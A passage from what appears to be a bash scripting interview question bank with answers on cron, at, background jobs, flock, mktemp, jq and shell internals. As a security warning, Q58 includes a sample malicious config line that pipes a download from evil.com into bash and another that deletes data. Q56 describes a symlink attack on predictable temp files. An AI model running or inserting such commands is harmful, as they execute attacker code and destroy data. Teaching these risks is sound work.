deploy.sh  # calls "python3" which is in /usr/local/bin

# Fix: set PATH explicitly at top of cron script
PATH=/usr/local/bin:/usr/bin:/bin
# Or use absolute paths everywhere: /usr/local/bin/python3
```

**2. Script not running as bash**
```bash
# Bad: crontab entry with bash-specific syntax, but /bin/sh runs it
* * * * * /opt/scripts/deploy.sh

# Fix: add shebang to the script
#!/usr/bin/env bash
# Or specify bash in crontab:
* * * * * /bin/bash /opt/scripts/deploy.sh
```

**3. Silent failures with no output**
```bash
# Fix: redirect output to a log file in crontab
* * * * * /bin/bash /opt/scripts/deploy.sh >> /var/log/deploy.log 2>&1
# Or email output (set MAILTO in crontab)
MAILTO=ops@company.com
```

**Key takeaway:** Cron scripts must be self-contained — explicit shebangs, absolute paths, and explicit `PATH` settings, always with output redirected to a log.

</details>

📖 **Theory:** [cron-scripting](./07_automation/cron_jobs.md#cron-jobs)


---

### Q52 · [Normal] · `at-command`

> **What is `at` used for vs `cron`? Give an example of scheduling a one-time command.**

<details>
<summary>💡 Show Answer</summary>

**Answer:**
`at` schedules a **one-time** command at a specific time. `cron` schedules **recurring** jobs. Think of `at` as "remind me once" and `cron` as "remind me every Tuesday."

```bash
# Schedule a command in 5 minutes
echo "/opt/scripts/send_report.sh" | at now + 5 minutes

# Schedule at a specific time
at 14:30 << 'EOF'
/bin/bash /opt/scripts/maintenance.sh >> /var/log/maintenance.log 2>&1
EOF

# Schedule for a specific date and time
echo "pg_dump mydb > /backup/db_$(date +%Y%m%d).sql" | at 02:00 tomorrow

# View scheduled jobs
atq

# Remove a job (job number from atq)
atrm 3

# at also accepts natural time specs
at noon next friday
at 9am + 3 days
```

**cron vs at:**

| Feature | `cron` | `at` |
|---------|--------|------|
| Recurrence | Repeating schedule | One-time only |
| Syntax | `* * * * *` spec | Natural time expressions |
| Use case | Nightly backups, log rotation | Deploy after off-hours, delayed notification |
| Persistence | Survives reboot | Survives reboot (stored in spool) |

**Key takeaway:** Use `at` for one-off deferred execution and `cron` for recurring schedules — they complement each other rather than compete.

</details>

📖 **Theory:** [at-command](./07_automation/scheduling.md#watch-continuous-command-monitoring)


---

### Q53 · [Normal] · `parallel-execution`

> **How do you run multiple background jobs in parallel and wait for all to complete? Show using `&` and `wait`.**

<details>
<summary>💡 Show Answer</summary>

**Answer:**

```bash
#!/usr/bin/env bash
set -euo pipefail

process_region() {
    local region="$1"
    echo "Starting: $region"
    sleep $((RANDOM % 3 + 1))   # simulate work
    echo "Done: $region"
}

# Collect PIDs for all background jobs
pids=()

for region in us-east-1 us-west-2 eu-west-1 ap-southeast-1; do
    process_region "$region" &
    pids+=($!)   # $! is the PID of the last background job
done

# Wait for all and check exit codes
failed=0
for pid in "${pids[@]}"; do
    if ! wait "$pid"; then
        echo "Job $pid failed" >&2
        failed=1
    fi
done

[[ $failed -eq 0 ]] || exit 1
echo "All regions processed successfully"
```

**How to think through this:**
1. `&` forks the command into the background immediately
2. `$!` captures the PID right after each `&` — store it before the next `&` overwrites it
3. `wait` with no args waits for ALL background jobs but does not give per-job exit status
4. `wait $pid` waits for a specific job and returns its exit code — allowing per-job error handling
5. For large fan-outs, limit concurrency with a semaphore or `xargs -P`

**Key takeaway:** Store PIDs in an array after each `&`, then `wait $pid` each one to capture individual exit codes — `wait` alone silently swallows failures.

</details>

📖 **Theory:** [parallel-execution](./04_functions/functions.md#functions-in-bash)


---

### Q54 · [Normal] · `job-control`

> **What happens to background jobs when a script exits? How does `disown` affect this?**

<details>
<summary>💡 Show Answer</summary>

**Answer:**
When a script exits, bash sends `SIGHUP` to all its background job group members — which by default **terminates them**. This is because the background jobs are still children of the script's process group.

```bash
#!/usr/bin/env bash

# Background job — will be killed when script exits
long_running_process &
PID=$!
echo "Started PID $PID"

# Option 1: disown removes the job from the shell's job table
# so it won't receive SIGHUP when the script exits
disown $PID

# Option 2: nohup at launch time
nohup long_running_process > /tmp/proc.log 2>&1 &
disown $!

# Option 3: redirect and disown together
long_running_process > /tmp/proc.log 2>&1 &
disown -h $!   # -h: mark job to not receive SIGHUP (but keep in job table)
```

**What `disown` does:**
1. Removes the job from the shell's job table (or with `-h`, just marks it immune to SIGHUP)
2. The process continues running as an orphan adopted by `init`/`systemd`
3. Useful when you realize after-the-fact that a job should outlive the script

**`nohup` vs `disown`:**
- `nohup` at launch: ignores SIGHUP AND redirects stdin/stdout — good for interactive sessions
- `disown` after launch: just detaches from job control — lighter touch

**Key takeaway:** Background jobs die with their parent script unless you `disown` them or use `nohup` — essential to understand for daemon-style processes launched from scripts.

</details>

📖 **Theory:** [job-control](./04_functions/functions.md#functions-in-bash)


---

### Q55 · [Normal] · `xargs-parallel`

> **What does `xargs -P 4 -I{} process {}` do? When would you use the `-P` flag?**

<details>
<summary>💡 Show Answer</summary>

**Answer:**
`xargs -P 4 -I{} process {}` runs up to **4 parallel instances** of `process` simultaneously, substituting each input item where `{}` appears.

```bash
# Process 4 files in parallel
ls *.log | xargs -P 4 -I{} gzip {}

# Download 8 URLs in parallel
cat urls.txt | xargs -P 8 -I{} curl -O {}

# Resize images with parallel ImageMagick
find . -name "*.png" | xargs -P $(nproc) -I{} convert {} -resize 800x {}

# With find -print0 for safe filenames
find . -name "*.csv" -print0 | xargs -0 -P 4 -I{} python3 process.py {}

# Control batch size: process 10 items per invocation, 4 workers
cat items.txt | xargs -P 4 -n 10 batch_process
```

**When to use `-P`:**
1. CPU-bound: image processing, compression, encryption — use `-P $(nproc)` to match core count
2. I/O-bound: file downloads, API calls — can use higher `-P` (e.g., 16, 32) since workers spend time waiting
3. When `&` + `wait` loops become unwieldy for large item sets
4. Quick parallelism without writing explicit job-management code

**How to think through this:**
1. `-P 0` means unlimited parallelism — launch a process per item (dangerous for large inputs)
2. `-I{}` is the replacement string; combine with `-n 1` to ensure one item per invocation (default with `-I`)
3. `-P` works across most systems but behavior on error varies — check exit codes carefully

**Key takeaway:** `xargs -P` is the fastest way to parallelize a list of independent tasks — pair it with `-0` and `find -print0` whenever filenames might contain spaces.

</details>

📖 **Theory:** [xargs-parallel](./05_input_output/pipes_and_redirection.md#pipes-and-redirection)


---

### Q56 · [Normal] · `temp-files-safely`

> **Why is `tmp=$(mktemp)` safer than `tmp=/tmp/script_$$`? What does `mktemp -d` create?**

<details>
<summary>💡 Show Answer</summary>

**Answer:**
`mktemp` creates a file with a **random, unpredictable name** and returns its path. `/tmp/script_$$` uses the predictable PID — an attacker can race to create a symlink at that path before your script does.

```bash
# Unsafe: predictable name — symlink attack possible
tmp=/tmp/myapp_$$
echo "data" > $tmp   # attacker pre-creates /tmp/myapp_1234 -> /etc/passwd

# Safe: mktemp creates file atomically with random suffix
tmp=$(mktemp)                         # /tmp/tmp.X7k2mP9q  (random)
tmp=$(mktemp /tmp/myapp.XXXXXX)       # /tmp/myapp.a3Kp2Z   (custom prefix)

# Always clean up
trap 'rm -f "$tmp"' EXIT

echo "Working file: $tmp"
```

`mktemp -d` creates a **temporary directory** instead of a file:

```bash
workdir=$(mktemp -d)
trap 'rm -rf "$workdir"' EXIT

cp important_file.txt "$workdir/"
process "$workdir/important_file.txt"
# directory auto-cleaned on exit
```

**Security issues with `/tmp/script_$$`:**
1. PID is predictable (small range, reused)
2. Attacker can pre-create `/tmp/script_1234` as a symlink to a sensitive file
3. Your script then writes data to the symlink target
4. `mktemp` uses `O_EXCL` — atomic creation that fails if the name already exists

**Key takeaway:** Always use `mktemp` for temporary files — it prevents TOCTOU race conditions that make predictable temp file names exploitable.

</details>

📖 **Theory:** [temp-files-safely](./05_input_output/file_operations.md#temporary-files)


---

### Q57 · [Normal] · `locking-scripts`

> **How do you prevent two instances of a script from running simultaneously? Show using `flock`.**

<details>
<summary>💡 Show Answer</summary>

**Answer:**
`flock` acquires an advisory file lock. If a second instance tries to run, it either waits or exits immediately — preventing concurrent execution.

```bash
#!/usr/bin/env bash
set -euo pipefail

LOCKFILE=/var/lock/myapp.lock

# Method 1: flock with a subshell (elegant)
(
    flock -n 9 || { echo "Another instance is running. Exiting." >&2; exit 1; }

    # All work goes here — lock held for the life of the subshell
    echo "Doing exclusive work..."
    sleep 10

) 9>"$LOCKFILE"

# Method 2: flock with exec (more explicit)
exec 9>"$LOCKFILE"
flock -n 9 || { echo "Already running" >&2; exit 1; }
# ... do work ...
# lock released automatically when script exits (FD 9 closes)
```

**`flock` options:**
```bash
flock -n 9       # non-blocking: fail immediately if lock unavailable
flock -w 30 9    # wait up to 30 seconds before giving up
flock -s 9       # shared (read) lock — multiple readers allowed
flock -x 9       # exclusive (write) lock — default
```

**How to think through this:**
1. The lock file itself does not need to contain anything — it is just an anchor for the kernel lock
2. When the script exits (normally or via signal), the FD closes and the lock is automatically released
3. `flock` uses kernel-level file locking — it survives crashes better than PID files
4. PID files are another approach (`/var/run/app.pid`) but require manual stale-lock detection

**Key takeaway:** `flock` on a file descriptor is the most robust way to ensure single-instance scripts — the kernel releases the lock automatically on process death.

</details>

📖 **Theory:** [locking-scripts](./07_automation/scheduling.md#at-in-scripts-fire-and-forget)


---

### Q58 · [Normal] · `config-files`

> **How do you source a config file in bash? What is the security risk of doing `source config.sh` with untrusted input?**

<details>
<summary>💡 Show Answer</summary>

**Answer:**
`source file` (or `. file`) executes the file in the **current shell context** — variables defined in it become available in the calling script.

```bash
# config.sh
DB_HOST=localhost
DB_PORT=5432
DB_NAME=production
MAX_RETRIES=3

# main_script.sh
source ./config.sh
# or: . ./config.sh  (POSIX equivalent)

echo "Connecting to $DB_HOST:$DB_PORT/$DB_NAME"
```

**The security risk — arbitrary code execution:**

```bash
# Malicious config.sh (if attacker controls the file)
DB_HOST=localhost
$(curl http://evil.com/payload | bash)   # executes attacker code
DB_PORT=5432

# Or
DB_HOST=$(rm -rf /important/data; echo localhost)
```

Sourcing a config file gives it **full shell privileges** — it can run any command, exfiltrate secrets, delete files, or establish persistence.

**Safer alternatives:**

```bash
# 1. Parse only KEY=VALUE lines (no command execution)
while IFS='=' read -r key value; do
    [[ "$key" =~ ^[A-Z_][A-Z0-9_]*$ ]] || continue
    declare "$key=$value"
done < config.env

# 2. Use env files with a specific format and a loader (e.g., python-dotenv, direnv)

# 3. Validate the config file is owned by root/trusted user before sourcing
stat -c "%U" config.sh | grep -q "^root$" || die "Config file not trusted"
```

**Key takeaway:** `source` is powerful and convenient — but treat it like `eval`: never source files you do not fully control, as it executes arbitrary shell code.

</details>

📖 **Theory:** [config-files](./01_shell_basics/first_script.md#your-first-shell-script)


---

### Q59 · [Normal] · `logging-pattern`

> **Write a logging function that writes timestamped messages to both stdout and a log file, with log levels (INFO, WARN, ERROR).**

<details>
<summary>💡 Show Answer</summary>

**Answer:**

```bash
#!/usr/bin/env bash
set -euo pipefail

# --- Logging setup ---
LOG_FILE="${LOG_FILE:-/var/log/myapp.log}"
LOG_LEVEL="${LOG_LEVEL:-INFO}"   # INFO, WARN, ERROR

declare -A LOG_LEVELS=([DEBUG]=0 [INFO]=1 [WARN]=2 [ERROR]=3)

log() {
    local level="${1:-INFO}"
    shift
    local message="$*"
    local timestamp
    timestamp=$(date '+%Y-%m-%d %H:%M:%S')

    # Skip if below configured log level
    [[ ${LOG_LEVELS[$level]:-1} -ge ${LOG_LEVELS[$LOG_LEVEL]:-1} ]] || return 0

    local line="[$timestamp] [$level] $message"

    # Write to stdout (ERROR goes to stderr)
    if [[ "$level" == "ERROR" ]]; then
        echo "$line" >&2
    else
        echo "$line"
    fi

    # Write to log file
    echo "$line" >> "$LOG_FILE"
}

log_info()  { log "INFO"  "$@"; }
log_warn()  { log "WARN"  "$@"; }
log_error() { log "ERROR" "$@"; }

# --- Usage ---
log_info  "Script started, PID=$$"
log_warn  "Config file not found, using defaults"
log_error "Failed to connect to database"
```

**Output:**
```
[2024-03-15 14:32:01] [INFO]  Script started, PID=12345
[2024-03-15 14:32:01] [WARN]  Config file not found, using defaults
[2024-03-15 14:32:01] [ERROR] Failed to connect to database
```

**How to think through this:**
1. `tee` could be used but separate writes give more control (e.g., ERROR to stderr)
2. Associative array for level comparison allows `LOG_LEVEL=WARN` to suppress INFO messages
3. `"$@"` in the helper functions passes all arguments — supports multi-word messages without quoting issues

**Key takeaway:** A structured logger with levels and timestamps is the difference between a script you can debug in production and one you fly blind with.

</details>

📖 **Theory:** [logging-pattern](./08_real_world_scripts/system_monitoring.md#logging)


---

### Q60 · [Normal] · `heredoc-advanced`

> **What is `<<-` (dash heredoc)? How does `cat << 'EOF'` (quoted delimiter) differ from `cat << EOF`?**

<details>
<summary>💡 Show Answer</summary>

**Answer:**

**`<<-` (dash heredoc):** strips leading **tabs** (not spaces) from each line — allows indented heredocs in scripts.

```bash
#!/usr/bin/env bash

generate_config() {
    local host="$1"
    cat <<- EOF
	[server]
	host = $host
	port = 8080
	EOF
    # Lines must use TABS for indentation (not spaces) for <<- to strip them
}

generate_config "myserver.local"
```

**Quoted vs unquoted delimiter:**

```bash
NAME="World"

# Unquoted delimiter: variables and commands ARE expanded
cat << EOF
Hello $NAME
Today is $(date)
EOF
# Output: Hello World
#         Today is Thu Mar 14 ...

# Quoted delimiter (single OR double quotes): NO expansion
cat << 'EOF'
Hello $NAME
Today is $(date)
EOF
# Output: Hello $NAME
#         Today is $(date)
```

**How to think through this:**
1. `<<-` is purely cosmetic — it lets you indent the heredoc body and closing delimiter with tabs for readability
2. Only **tabs** are stripped by `<<-` — if you indent with spaces, they remain
3. `<< 'EOF'` treats the entire heredoc as a single-quoted string — no variable expansion, no command substitution
4. Use quoted delimiter when generating scripts, config templates, or SQL that contains `$` or `$()` literally

**Key takeaway:** Use `<<-` for indented heredocs in functions; use `<< 'EOF'` when the content should be treated as a raw literal with no bash expansion.

</details>

📖 **Theory:** [heredoc-advanced](./05_input_output/pipes_and_redirection.md#pipes-and-redirection)


---

### Q61 · [Normal] · `string-to-array`

> **Given `IFS=':' read -ra parts <<< "$PATH"`, what does this do? What is `IFS` and why is it reset?**

<details>
<summary>💡 Show Answer</summary>

**Answer:**
This splits the `$PATH` string on `:` and stores each component as an element of the `parts` array.

```bash
echo $PATH
# /usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin

IFS=':' read -ra parts <<< "$PATH"

echo "${#parts[@]}"    # 5 (number of elements)
echo "${parts[0]}"     # /usr/local/bin
echo "${parts[2]}"     # /bin

# Iterate safely
for dir in "${parts[@]}"; do
    echo "PATH component: $dir"
done
```

**What `IFS` is:**
`IFS` (Internal Field Separator) is a special bash variable that controls how word-splitting works. Default value is `space`, `tab`, `newline`.

**Why setting it inline (`IFS=':' read ...`) is important:**

```bash
# Inline assignment: IFS is set ONLY for the duration of this command
IFS=':' read -ra parts <<< "$PATH"
echo "$IFS"    # still the original value (space/tab/newline)

# vs global assignment: affects all subsequent word-splitting
IFS=':'
read -ra parts <<< "$PATH"
echo "hello world" | awk '{print $1}'  # might behave unexpectedly now
IFS=$' \t\n'   # must manually reset
```

**`-r` flag:** prevents backslash interpretation  
**`-a` flag:** reads into an array  
**`<<< "string"`:** here-string — feeds a string to stdin without a subshell

**Key takeaway:** `IFS=':' read -ra arr <<< "$str"` is the idiomatic, safe way to split a delimited string into an array — scoping `IFS` to just that command avoids polluting the shell's word-splitting globally.

</details>

📖 **Theory:** [string-to-array](./02_variables_and_data/arrays.md#method-4-capture-command-output-into-array-safer--handles-spaces)


---

### Q62 · [Normal] · `null-separated`

> **Why is `find ... -print0 | xargs -0` safer than `find ... | xargs` when filenames might contain spaces?**

<details>
<summary>💡 Show Answer</summary>

**Answer:**
Standard `find | xargs` uses **newline** as the delimiter between filenames. A filename with a space or newline in it gets split into multiple arguments — causing the wrong files to be processed or commands to fail.

```bash
# UNSAFE: space in filename breaks xargs
find /data -name "*.log" | xargs rm
# "report 2024.log" becomes two arguments: "report" and "2024.log"
# xargs tries to rm "report" (wrong) and "2024.log" (wrong)

# SAFE: null byte as delimiter — null cannot appear in a filename
find /data -name "*.log" -print0 | xargs -0 rm
# "report 2024.log\0" — treated as one argument, null is the boundary

# Real-world examples
find . -name "*.tmp" -print0 | xargs -0 rm -f
find . -type f -print0 | xargs -0 chmod 644
find /uploads -name "* *" -print0 | xargs -0 -I{} mv {} /safe/

# read also handles null-separated input
find . -print0 | while IFS= read -r -d '' file; do
    echo "Processing: $file"
done
```

**Why null byte works:**
1. The null byte (`\0`) is the only character that **cannot** appear in a Unix filename or path
2. `-print0` outputs filenames separated by `\0` instead of `\n`
3. `xargs -0` reads `\0`-delimited input — treating each null-terminated string as one argument

**Key takeaway:** Always use `-print0 | xargs -0` in production scripts — any filename with a space, newline, or special character will silently break the plain `find | xargs` pattern.

</details>

📖 **Theory:** [null-separated](./05_input_output/pipes_and_redirection.md#devnull-the-black-hole)


---

### Q63 · [Normal] · `script-best-practices`

> **Name 5 best practices for production bash scripts (beyond `set -euo pipefail`).**

<details>
<summary>💡 Show Answer</summary>

**Answer:**

**1. Always use a shebang and be explicit about the shell**
```bash
#!/usr/bin/env bash   # finds bash in PATH — more portable than #!/bin/bash
```

**2. Validate all inputs before doing any work**
```bash
[[ $# -ge 2 ]]  || die "Usage: $0 <file> <count>"
[[ -f "$1" ]]   || die "File not found: $1"
[[ "$2" =~ ^[0-9]+$ ]] || die "Count must be a positive integer"
```

**3. Use `readonly` for constants and `local` for function variables**
```bash
readonly CONFIG_DIR="/etc/myapp"
readonly MAX_RETRIES=3

process() {
    local input="$1"    # local prevents leaking into global scope
    local result
    result=$(transform "$input")
    echo "$result"
}
```

**4. Quote all variable expansions**
```bash
# Bad: word-splitting and globbing on unquoted variables
cp $source $dest
for f in $files; do ...

# Good: always double-quote
cp "$source" "$dest"
for f in "${files[@]}"; do ...
```

**5. Write idempotent scripts — safe to run multiple times**
```bash
# Bad: fails on second run
mkdir /opt/myapp
useradd myapp

# Good: check before acting
[[ -d /opt/myapp ]] || mkdir /opt/myapp
id myapp &>/dev/null || useradd myapp
```

**Bonus practices:**
- Log with timestamps and levels
- Use `mktemp` + `trap EXIT` for temp files
- Add `--dry-run` mode for destructive operations
- Pin tool versions in scripts that call external commands
- Keep scripts under 200 lines — extract functions into libraries

**Key takeaway:** A production bash script earns its name through defensive input handling, explicit quoting, idempotency, and cleanup — not just functional logic.

</details>

📖 **Theory:** [script-best-practices](./08_real_world_scripts/deployment_scripts.md#deployment-scripts)


---

### Q64 · [Normal] · `version-check`

> **Write a bash function that checks if a tool is installed and its version is >= required version (e.g., requires bash >= 4.0).**

<details>
<summary>💡 Show Answer</summary>

**Answer:**

```bash
#!/usr/bin/env bash
set -euo pipefail

# Compare two version strings: returns 0 if v1 >= v2
version_gte() {
    local v1="$1"
    local v2="$2"

    # Sort both versions and check if v2 comes first (meaning v1 >= v2)
    printf '%s\n%s\n' "$v2" "$v1" | sort -V | head -n1 | grep -qx "$v2"
}

# Check if a tool is installed and meets minimum version
require_tool() {
    local tool="$1"
    local required_version="$2"
    local version_cmd="${3:-$tool --version}"   # optional custom version command

    # Check tool exists
    if ! command -v "$tool" &>/dev/null; then
        echo "[ERROR] Required tool not found: $tool" >&2
        return 1
    fi

    # Extract version number (first x.y.z pattern found)
    local installed_version
    installed_version=$(eval "$version_cmd" 2>&1 | grep -oE '[0-9]+\.[0-9]+(\.[0-9]+)?' | head -n1)

    if [[ -z "$installed_version" ]]; then
        echo "[WARN] Could not determine version of $tool — proceeding anyway" >&2
        return 0
    fi

    if version_gte "$installed_version" "$required_version"; then
        echo "[OK] $tool $installed_version >= $required_version"
    else
        echo "[ERROR] $tool $installed_version is below required $required_version" >&2
        return 1
    fi
}

# Usage
require_tool "bash"   "4.0"  "bash --version"
require_tool "git"    "2.30" "git --version"
require_tool "python3" "3.9" "python3 --version"
require_tool "jq"     "1.6"
```

**How to think through this:**
1. `command -v tool` is the POSIX way to check if a tool is in PATH — prefer over `which`
2. `sort -V` is version-aware sort (natural sort for dotted numbers)
3. The `version_gte` function feeds both versions to `sort -V` and checks if the smaller one (`v2` = required) appears first
4. `grep -oE '[0-9]+\.[0-9]+'` handles varied `--version` output formats (`git version 2.39.1`, `Python 3.11.4`, etc.)

**Key takeaway:** Version checking in bash reduces to: does it exist? extract the version string? compare with `sort -V` — the last step handles multi-part version numbers correctly where naive string comparison fails.

</details>

📖 **Theory:** [version-check](./01_shell_basics/first_script.md#usage--------deploysh-environment-version)


---

### Q65 · [Normal] · `json-in-bash`

> **How do you parse JSON in bash? What tool do you use? Show extracting a field from `{"status": "ok", "count": 42}`.**

<details>
<summary>💡 Show Answer</summary>

**Answer:**
Bash has no native JSON support — use `jq`, a purpose-built command-line JSON processor. Never parse JSON with `grep`/`awk`/`sed` — it breaks on nested structures and encoding variations.

```bash
JSON='{"status": "ok", "count": 42, "tags": ["prod", "us-east"]}'

# Extract a string field
status=$(echo "$JSON" | jq -r '.status')
echo "$status"     # ok

# Extract a number
count=$(echo "$JSON" | jq '.count')
echo "$count"      # 42

# Extract array element
first_tag=$(echo "$JSON" | jq -r '.tags[0]')
echo "$first_tag"  # prod

# Extract array as bash array
mapfile -t tags < <(echo "$JSON" | jq -r '.tags[]')
echo "${tags[@]}"  # prod us-east

# Conditional on JSON value
if [[ $(echo "$JSON" | jq -r '.status') == "ok" ]]; then
    echo "Service is healthy"
fi

# From a file
jq -r '.config.database.host' config.json

# From an API response
curl -s https://api.example.com/health | jq -r '.status'

# Compact output (no pretty print) — useful for passing to next command
echo "$JSON" | jq -c '.'
```

**`-r` flag:** outputs raw strings (no JSON quotes around string values)  
**`.field`:** dot notation for key access  
**`.[N]`:** array index access  
**`.[]`:** iterate all array elements

**Key takeaway:** Always use `jq` for JSON in bash — attempting to parse JSON with text tools is a fragile, maintenance nightmare that breaks on nested data and special characters.

</details>

📖 **Theory:** [json-in-bash](./08_real_world_scripts/system_monitoring.md#system-monitoring-script)


---

### Q66 · [Normal] · `performance-bash`

> **Why is spawning subprocesses expensive in bash? Give 3 examples of replacing external commands with bash builtins.**

<details>
<summary>💡 Show Answer</summary>

**Answer:**
Every `$(command)` or `command | pipe` forks a new process — which involves a `fork()` syscall, copying the process memory space, executing the binary, and waiting for it to finish. In a tight loop, this adds up to significant overhead.

**Why it is expensive:**
1. `fork()` copies the parent process address space (even with copy-on-write, the kernel work is non-trivial)
2. The external binary must be loaded from disk (or cache) and linked
3. In a loop running 10,000 iterations, `$(echo "$x")` spawns 10,000 processes

**3 replacements: external command → bash builtin**

**1. String length: `wc -c` → `${#var}`**
```bash
# Slow: spawns wc
len=$(echo -n "$str" | wc -c)

# Fast: builtin, no fork
len=${#str}
```

**2. Uppercase/lowercase: `tr` → `${var^^}` / `${var,,}`**
```bash
# Slow: spawns tr
upper=$(echo "$str" | tr '[:lower:]' '[:upper:]')

# Fast: bash 4+ parameter expansion
upper="${str^^}"
lower="${str,,}"
```

**3. String replacement: `sed` → `${var//pattern/replacement}`**
```bash
# Slow: spawns sed
result=$(echo "$str" | sed 's/foo/bar/g')

# Fast: builtin substitution
result="${str//foo/bar}"

# Other substitutions
result="${str/foo/bar}"       # replace first match
result="${str#prefix}"        # strip leading prefix
result="${str%suffix}"        # strip trailing suffix
```

**Bonus: checking if substring exists: `grep` → `[[ =~ ]]`**
```bash
# Slow: spawns grep
echo "$str" | grep -q "pattern"

# Fast: builtin regex test
[[ "$str" =~ pattern ]]
```

**Key takeaway:** Bash parameter expansion (`${var//...}`, `${#var}`, `${var^^}`) replaces most `sed`/`tr`/`awk`/`wc` one-liners with zero subprocess cost — critical in loops processing thousands of items.

</details>

📖 **Theory:** [performance-bash](./08_real_world_scripts/system_monitoring.md#system-monitoring-script)


---

## 🟠 Tier 3 — Advanced

### Q67 · [Thinking] · `bash-internals`

> **What happens inside bash when you run `echo hello`? Describe the stages: tokenization, parsing, expansion, and execution.**

<details>
<summary>💡 Show Answer</summary>

**Answer:**
Bash processes every command through four sequential stages before anything runs.

**How to think through this:**
1. **Tokenization** — Bash reads the raw input `echo hello` and splits it into tokens using whitespace and metacharacters as delimiters. Tokens here are `echo` and `hello`.
2. **Parsing** — Tokens are assembled into a command structure. Bash identifies this as a simple command with one word (`echo`) as the command and one argument (`hello`). Pipes, redirections, and compound commands are resolved here.
3. **Expansion** — Before execution, bash performs expansions in order: brace expansion → tilde expansion → parameter/variable expansion → command substitution → arithmetic expansion → word splitting → pathname (glob) expansion → quote removal. For `echo hello` there is nothing to expand.
4. **Execution** — Bash looks up `echo`. Since `echo` is a shell builtin, it calls the builtin directly without forking. If it were `/bin/echo`, bash would fork and exec.

**Key takeaway:** Bash expands everything before executing — understanding this order explains most quoting and globbing bugs.

</details>

📖 **Theory:** [bash-internals](./01_shell_basics/shebang_and_execution.md#shebang-lines-and-script-execution)


---

### Q68 · [Thinking] · `fork-exec`

> **What is the fork-exec model? Why does every external command in bash spawn a new process?**

<details>
<summary>💡 Show Answer</summary>

**Answer:**
Fork-exec is the Unix mechanism for creating new processes: `fork()` duplicates the current process, then `exec()` replaces the duplicate's memory with a new program.

**How to think through this:**
1. When bash needs to run `/bin/ls`, it cannot simply "jump" to that program — it would lose its own state.
2. Bash calls `fork()`, which creates an identical child process (same memory, file descriptors, environment). This is cheap because the kernel uses copy-on-write — pages are only copied when written.
3. The child process calls `exec("/bin/ls", ...)`, which replaces the child's memory image with `ls`. The original bash process is untouched and waits with `wait()`.
4. When `ls` exits, bash resumes and captures the exit code via `$?`.
5. Builtins like `cd` and `export` cannot use fork-exec because they must modify the parent shell's state (working directory, environment). They run directly inside bash.

**Key takeaway:** Fork-exec is why `cd` must be a builtin — a child process changing its own directory has no effect on the parent.

</details>

📖 **Theory:** [fork-exec](./01_shell_basics/shebang_and_execution.md#shebang-lines-and-script-execution)


---

### Q69 · [Thinking] · `builtin-vs-external`

> **What is the difference between bash builtins (like `cd`, `echo`, `read`) and external commands (like `/bin/echo`)? How do you tell which is which?**

<details>
<summary>💡 Show Answer</summary>

**Answer:**
Builtins are functions compiled into bash itself; external commands are separate executables on disk.

**How to think through this:**
1. **Builtins** run inside the current shell process — no fork, no new process. They can read and modify shell state: variables, current directory, file descriptors. Examples: `cd`, `read`, `export`, `set`, `echo`, `printf`, `test`.
2. **External commands** live on the filesystem (e.g., `/bin/ls`, `/usr/bin/grep`). Bash forks before running them. They inherit the environment but cannot change the parent shell's variables or directory.
3. **How to check:** Use `type` — the most reliable tool.
   - `type echo` → `echo is a shell builtin`
   - `type ls` → `ls is /bin/ls`
   - `type -a echo` shows all matches (builtin AND `/bin/echo` if both exist)
4. Use `command echo` to bypass the builtin and force the external version. Use `builtin echo` to force the builtin.

**Key takeaway:** Use `type -a <name>` to determine whether a command is a builtin, function, alias, or external binary.

</details>

📖 **Theory:** [builtin-vs-external](./01_shell_basics/first_script.md#your-first-shell-script)


---

### Q70 · [Thinking] · `word-splitting`

> **What is word splitting in bash? Why does `for file in $(ls)` break on filenames with spaces? What is the fix?**

<details>
<summary>💡 Show Answer</summary>

**Answer:**
Word splitting is the stage where bash splits the result of unquoted expansions into separate words using the characters in `$IFS` (default: space, tab, newline).

**How to think through this:**
1. `$(ls)` performs command substitution. The output is a string like `file one.txt\nfile two.txt\n`.
2. Because it is unquoted, bash applies word splitting. It splits on spaces AND newlines, so `file one.txt` becomes two words: `file` and `one.txt`.
3. The loop iterates over `file`, `one.txt`, `file`, `two.txt` — never seeing the real filenames.
4. **Fix 1 — use a glob:** `for file in /path/*.txt` — globs expand to proper quoted words and never split on spaces.
5. **Fix 2 — use `find` with `-print0`:**
   ```
   while IFS= read -r -d '' file; do ...; done < <(find . -name "*.txt" -print0)
   ```
6. **Fix 3 — use an array:** `files=(*.txt); for file in "${files[@]}"`

**Key takeaway:** Never parse `ls` output — always use globs or `find -print0` to handle filenames safely.

</details>

📖 **Theory:** [word-splitting](./02_variables_and_data/variables.md#variables-and-data-in-bash)


---

### Q71 · [Thinking] · `glob-vs-regex`

> **What is the difference between bash globs and regular expressions? Why does `[[ $var =~ *.log ]]` fail as a regex?**

<details>
<summary>💡 Show Answer</summary>

**Answer:**
Globs are simple filename patterns; regular expressions are a full pattern language. They use different syntax and are used in different contexts.

**How to think through this:**
1. **Globs** use `*` (any characters), `?` (one character), `[abc]` (character class). They are used in filename expansion and `case` statements. `*` in a glob means "zero or more of any character."
2. **Regex** uses `.*` for "zero or more of any character", `.` for "any single character", `^` and `$` for anchors, `+`, `?`, `|`, etc. Used in `[[ =~ ]]`, `grep`, `sed`, `awk`.
3. **Why `[[ $var =~ *.log ]]` fails:** In regex, `*` is a quantifier meaning "zero or more of the preceding character." With nothing before it, `*.log` is an invalid regex — or at best matches `.log`, `.log`, `alog` depending on the engine. The author meant "anything ending in .log" which in regex is `.*\.log$`.
4. The glob equivalent `[[ $var == *.log ]]` (with `==`) works correctly because `==` inside `[[ ]]` does glob matching.

**Key takeaway:** Inside `[[ ]]`, use `==` for glob matching and `=~` for regex — they use completely different pattern syntax.

</details>

📖 **Theory:** [glob-vs-regex](./03_control_flow/conditionals.md#pattern-matching-glob-style-not-regex)


---

### Q72 · [Thinking] · `process-groups`

> **What is a process group? What happens when you kill a process group leader vs kill a child process?**

<details>
<summary>💡 Show Answer</summary>

**Answer:**
A process group is a collection of related processes that can receive signals together. Every process belongs to exactly one process group, identified by a PGID.

**How to think through this:**
1. When bash runs a pipeline like `cmd1 | cmd2 | cmd3`, it creates a new process group for all three processes. The PGID is set to the PID of the first process.
2. **Killing a child process** (e.g., `kill <pid>`) sends a signal to just that one process. Siblings in the pipeline are unaffected (though they may fail due to broken pipes).
3. **Killing the process group leader** (the process whose PID equals the PGID) sends the signal only to the leader — NOT automatically to all members. The group persists; other members keep running.
4. **To kill the entire group:** use `kill -- -<PGID>` (negative PGID). This sends the signal to every process in the group simultaneously.
5. This matters for job control: pressing Ctrl+C sends SIGINT to the foreground process group, which is why all processes in a pipeline are terminated.

